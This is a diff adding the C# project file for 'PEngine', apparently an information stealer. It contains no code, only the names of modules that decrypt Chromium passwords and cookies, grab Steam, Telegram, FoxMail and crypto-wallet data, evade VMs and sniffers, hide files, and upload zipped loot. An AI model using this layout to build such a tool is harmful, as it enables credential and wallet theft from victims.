@@ -1,0 +1,149 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{5673693E-2385-4A91-A899-184BC58E7A4F}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>PEngine</RootNamespace>
+    <AssemblyName>PEngine</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <DocumentationFile>
+    </DocumentationFile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+  <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>PEngine.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Ionic.Zip">
+      <HintPath>C:\Users\Antlion\Desktop\Важно\PEngine\PEngine\bin\Debug\Ionic.Zip.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>C:\Users\Antlion\Desktop\Важно\PEngine\PEngine\bin\Debug\Newtonsoft.Json.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Data.SQLite">
+      <HintPath>C:\Users\Antlion\Desktop\Важно\PEngine\PEngine\bin\Debug\System.Data.SQLite.dll</HintPath>
+      <Private>False</Private>
+    </Reference>
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Engine\Applications\FoxMail\FoxMailPath.cs" />
+    <Compile Include="Engine\Applications\FoxMail\MailFoxPassword.cs" />
+    <Compile Include="Engine\Applications\Steam\GetSteamFiles.cs" />
+    <Compile Include="Engine\Applications\Steam\SteamConverter.cs" />
+    <Compile Include="Engine\Applications\Steam\SteamPath.cs" />
+    <Compile Include="Engine\Applications\Steam\SteamProfiles.cs" />
+    <Compile Include="Engine\Applications\Telegram\TGrabber.cs" />
+    <Compile Include="Engine\Browsers\Chromium\BaseAccount.cs" />
+    <Compile Include="Engine\Browsers\Chromium\ChromeDecrypt.cs" />
+    <Compile Include="Engine\Browsers\Chromium\ChromeSearcher.cs" />
+    <Compile Include="Engine\Browsers\Chromium\Cookies\BaseCookies.cs" />
+    <Compile Include="Engine\Browsers\Chromium\Cookies\ChromeCookiesSearcher.cs" />
+    <Compile Include="Engine\Browsers\Chromium\Cookies\GetCookies.cs" />
+    <Compile Include="Engine\Browsers\Chromium\GetApplication.cs" />
+    <Compile Include="Engine\Browsers\Chromium\GetPassword.cs" />
+    <Compile Include="Engine\Cryptocurrencies\BitBoard.cs" />
+    <Compile Include="Engine\InfoPC\InfoGrabber.cs" />
+    <Compile Include="Engine\InfoPC\ProcessList.cs" />
+    <Compile Include="Engine\InfoPC\WinKey.cs" />
+    <Compile Include="Engine\Others\ClientDecrypt.cs" />
+    <Compile Include="Engine\Others\GetClients.cs" />
+    <Compile Include="Helpers\CombineEx.cs" />
+    <Compile Include="Helpers\Enums.cs" />
+    <Compile Include="Helpers\NativeMethods.cs" />
+    <Compile Include="Helpers\NetControl.cs" />
+    <Compile Include="Helpers\OSLibrary.cs" />
+    <Compile Include="Helpers\ProcessKiller.cs" />
+    <Compile Include="Helpers\ProxyGrabber.cs" />
+    <Compile Include="Helpers\SaveData.cs" />
+    <Compile Include="Helpers\Structures.cs" />
+    <Compile Include="Loader\IPLogger.cs" />
+    <Compile Include="Loader\MovEx.cs" />
+    <Compile Include="Loader\SafeDll.cs" />
+    <Compile Include="Loader\UploadZip.cs" />
+    <Compile Include="Loader\Users.cs" />
+    <Compile Include="Main\Archiving.cs" />
+    <Compile Include="Main\Ccleaner.cs" />
+    <Compile Include="Main\ClipboardEx.cs" />
+    <Compile Include="Main\Date.cs" />
+    <Compile Include="Main\GlobalPath.cs" />
+    <Compile Include="Main\HideFiles.cs" />
+    <Compile Include="Main\HideFolders.cs" />
+    <Compile Include="Main\HomeDirectory.cs" />
+    <Compile Include="Shell\Updater.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Shell\Updater.Designer.cs">
+      <DependentUpon>Updater.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Shell\Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Sticks\AntiSniffer.cs" />
+    <Compile Include="Sticks\AntiVM.cs" />
+    <Compile Include="Sticks\BlockIE.cs" />
+    <Compile Include="Sticks\DisableLockers.cs" />
+    <Compile Include="Sticks\ScreenShot.cs" />
+    <EmbeddedResource Include="Shell\Updater.resx">
+      <DependentUpon>Updater.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Shell\App.config" />
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
